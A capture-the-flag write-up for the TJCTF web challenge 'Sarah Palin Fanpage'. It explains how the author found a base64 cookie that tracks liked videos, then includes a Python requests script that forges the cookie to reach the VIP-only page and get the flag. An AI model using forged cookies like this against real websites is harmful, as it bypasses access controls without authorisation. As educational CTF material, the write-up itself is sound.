---
title: 'Sarah Palin Fanpage - WEB[ 35 ]'
created: '2020-05-28T10:56:45.789Z'
modified: '2020-05-28T11:13:02.025Z'
---

# Sarah Palin Fanpage - WEB[ 35 ]

```
Are you a true fan of Alaska's most famous governor? Visit the Sarah Palin fanpage.
https://sarah_palin_fanpage.tjctf.org
```

### Recon :
```
We are transferred to a page with videos of Sarah Palin and it has a VIP are only accessible if we like every video of Sarah Palin on `Top 10 Moments`.
So sometimes you have to fall into the pit to know what lesson it would teach and
therefore i too went to like the videos. And obviously it wouldn'y be that easy.
There was a limit to the number of videos you can like. So we can't like 10 videos that easy.
...
Then I looked at the cookies of the page. You can do this easily with any cookie manager for the browser you're using or your simple inbuilt dev tools in the browser.

A data cookie with base64 encoded value was present. You decode it and voila , it's a dictionary keeping track of the videos you've liked or not.
```

### Solution :
```
So I wrote a python script with requests module to access the webpage and send the request with my own forged cookie. I made a dictionary with all the videos as liked and base64 encoded it so that to feed the value as cookie.

After sending the request and seeing the output of the VIP exclusive area, we get our flag.
```
```
#!/usr/bin/env python3

import requests
import base64
from urllib.parse import quote

url = "https://sarah_palin_fanpage.tjctf.org/"

data = quote(base64.b64encode(
    '{"1":true,"2":true,"3":true,"4":true,"5":true,"6":true,"7":true,"8":true,"9":true,"10":true}'.encode()))

cookies = {"data" : data}
# print(cookies)
r = requests.get(url + "exclusive", cookies=cookies)

print(r.text)

```


